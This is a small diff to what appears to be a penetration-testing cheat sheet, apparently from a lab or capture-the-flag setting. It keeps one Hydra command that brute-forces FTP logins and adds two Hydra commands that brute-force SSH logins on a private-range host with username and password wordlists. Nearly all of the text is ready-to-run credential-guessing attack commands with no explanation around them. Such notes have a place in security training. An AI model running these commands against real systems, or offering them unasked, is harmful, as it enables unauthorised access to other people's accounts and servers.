@@ -1,4 +1,6 @@
 hydra 10.10.91.23 ftp -l user -P passlist.txt -s 21
+hydra 10.10.4.206 ssh -L Usernames/top-usernames-shortlist.txt -P Passwords/bt4-password.txt -s 22
+hydra 10.10.4.206 ssh -L Usernames/top-usernames-shortlist.txt -p pswd -s 22
 
 SSH
 
